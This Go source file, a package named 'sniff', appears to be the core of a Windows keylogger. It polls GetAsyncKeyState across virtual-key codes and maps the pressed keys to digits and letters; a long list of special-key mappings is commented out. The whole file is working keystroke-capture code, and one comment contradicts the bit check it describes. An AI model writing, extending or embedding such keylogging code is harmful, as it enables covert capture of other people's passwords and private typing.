package sniff

import (
	"github.com/securityclippy/winctl/pkg/proc"
)

func LogKey() (string) {
	// Query key mapped to integer `0x00` to `0xFF` if it's pressed.
	for i := 0; i < 0xFF; i++ {
		asynch, _, _ := proc.GetAsyncKeyState.Call(uintptr(i))

		// If the least significant bit is set ignore it.
		//
		// As it's written in the documentation:
		// `if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState.`
		// Which we don't care about :)
		if asynch&0x1 == 0 {
			continue
		} else {
			return mapKey(i)
		}
	}

	return ""
}

func mapKey(key int) string {
	switch key {
	/*
	case w32.VK_CONTROL:
		return "[Ctrl]"
	case w32.VK_BACK:
		return "[Back]"
	case w32.VK_TAB:
		return "[Tab]"
	case w32.VK_RETURN:
		return "[Enter]\r\n"
	case w32.VK_SHIFT:
		return "[Shift]"
	case w32.VK_MENU:
		return "[Alt]"
	case w32.VK_CAPITAL:
		return "[CapsLock]"
	case w32.VK_ESCAPE:
		return "[Esc]"
	case w32.VK_SPACE:
		return " "
	case w32.VK_PRIOR:
		return "[PageUp]"
	case w32.VK_NEXT:
		return "[PageDown]"
	case w32.VK_END:
		return "[End]"
	case w32.VK_HOME:
		return "[Home]"
	case w32.VK_LEFT:
		return "[Left]"
	case w32.VK_UP:
		return "[Up]"
	case w32.VK_RIGHT:
		return "[Right]"
	case w32.VK_DOWN:
		return "[Down]"
	case w32.VK_SELECT:
		return "[Select]"
	case w32.VK_PRINT:
		return "[Print]"
	case w32.VK_EXECUTE:
		return "[Execute]"
	case w32.VK_SNAPSHOT:
		return "[PrintScreen]"
	case w32.VK_INSERT:
		return "[Insert]"
	case w32.VK_DELETE:
		return "[Delete]"
	case w32.VK_HELP:
		return "[Help]"
	case w32.VK_LWIN:
		return "[LeftWindows]"
	case w32.VK_RWIN:
		return "[RightWindows]"
	case w32.VK_APPS:
		return "[Applications]"
	case w32.VK_SLEEP:
		return "[Sleep]"
	case w32.VK_NUMPAD0:
		return "[Pad 0]"
	case w32.VK_NUMPAD1:
		return "[Pad 1]"
	case w32.VK_NUMPAD2:
		return "[Pad 2]"
	case w32.VK_NUMPAD3:
		return "[Pad 3]"
	case w32.VK_NUMPAD4:
		return "[Pad 4]"
	case w32.VK_NUMPAD5:
		return "[Pad 5]"
	case w32.VK_NUMPAD6:
		return "[Pad 6]"
	case w32.VK_NUMPAD7:
		return "[Pad 7]"
	case w32.VK_NUMPAD8:
		return "[Pad 8]"
	case w32.VK_NUMPAD9:
		return "[Pad 9]"
	case w32.VK_MULTIPLY:
		return "*"
	case w32.VK_ADD:
		return "+"
	case w32.VK_SEPARATOR:
		return "[Separator]"
	case w32.VK_SUBTRACT:
		return "-"
	case w32.VK_DECIMAL:
		return "."
	case w32.VK_DIVIDE:
		return "[Devide]"
	case w32.VK_F1:
		return "[F1]"
	case w32.VK_F2:
		return "[F2]"
	case w32.VK_F3:
		return "[F3]"
	case w32.VK_F4:
		return "[F4]"
	case w32.VK_F5:
		return "[F5]"
	case w32.VK_F6:
		return "[F6]"
	case w32.VK_F7:
		return "[F7]"
	case w32.VK_F8:
		return "[F8]"
	case w32.VK_F9:
		return "[F9]"
	case w32.VK_F10:
		return "[F10]"
	case w32.VK_F11:
		return "[F11]"
	case w32.VK_F12:
		return "[F12]"
	case w32.VK_NUMLOCK:
		return "[NumLock]"
	case w32.VK_SCROLL:
		return "[ScrollLock]"
	case w32.VK_LSHIFT:
		return "[LeftShift]"
	case w32.VK_RSHIFT:
		return "[RightShift]"
	case w32.VK_LCONTROL:
		return "[LeftCtrl]"
	case w32.VK_RCONTROL:
		return "[RightCtrl]"
	case w32.VK_LMENU:
		return "[LeftMenu]"
	case w32.VK_RMENU:
		return "[RightMenu]"
	case w32.VK_OEM_1:
		return ";"
	case w32.VK_OEM_2:
		return "/"
	case w32.VK_OEM_3:
		return "`"
	case w32.VK_OEM_4:
		return "["
	case w32.VK_OEM_5:
		return "\\"
	case w32.VK_OEM_6:
		return "]"
	case w32.VK_OEM_7:
		return "'"
	case w32.VK_OEM_PERIOD:
		return "."

	 */
	case 0x30:
		return "0"
	case 0x31:
		return "1"
	case 0x32:
		return "2"
	case 0x33:
		return "3"
	case 0x34:
		return "4"
	case 0x35:
		return "5"
	case 0x36:
		return "6"
	case 0x37:
		return "7"
	case 0x38:
		return "8"
	case 0x39:
		return "9"
	case 0x41:
		return "a"
	case 0x42:
		return "b"
	case 0x43:
		return "c"
	case 0x44:
		return "d"
	case 0x45:
		return "e"
	case 0x46:
		return "f"
	case 0x47:
		return "g"
	case 0x48:
		return "h"
	case 0x49:
		return "i"
	case 0x4A:
		return "j"
	case 0x4B:
		return "k"
	case 0x4C:
		return "l"
	case 0x4D:
		return "m"
	case 0x4E:
		return "n"
	case 0x4F:
		return "o"
	case 0x50:
		return "p"
	case 0x51:
		return "q"
	case 0x52:
		return "r"
	case 0x53:
		return "s"
	case 0x54:
		return "t"
	case 0x55:
		return "u"
	case 0x56:
		return "v"
	case 0x57:
		return "w"
	case 0x58:
		return "x"
	case 0x59:
		return "y"
	case 0x5A:
		return "z"
	}
	return ""
}
